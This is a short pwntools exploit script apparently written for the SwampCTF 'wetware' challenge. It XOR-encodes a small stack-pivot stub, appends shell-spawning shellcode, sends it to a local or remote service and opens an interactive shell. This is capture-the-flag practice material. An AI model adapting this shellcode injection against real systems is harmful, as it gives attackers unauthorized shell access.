from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./wetware")
else:
	p = remote("chal1.swampctf.com","1337")

def debugf():
	gdb.attach(p,"b *0x400168\nb *0x400194")

def gen_sc(sc,info):
	res = ""
	for i in range(len(sc)):
		res += chr(ord(sc[i]) ^ ord(info[i]))
	return res

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
context.bits = 64
context.arch = "amd64"
sc = asm("add rsp,8;jmp rsp").ljust(8,"\x90")
#debugf()
info = "0xd2    0x6f    0x65    0x6d    0x6f    0x26    0xd7    0x8c"
info = info.replace(" ","").split("0x")[1:]
res = ""
for i in range(len(info)):
	res += chr(int(info[i],16))
sc = gen_sc(sc,res)
sc = sc[:8] + asm(shellcraft.sh())
p.sendlineafter("Holographic demux codephrase required: ",sc)
p.interactive()
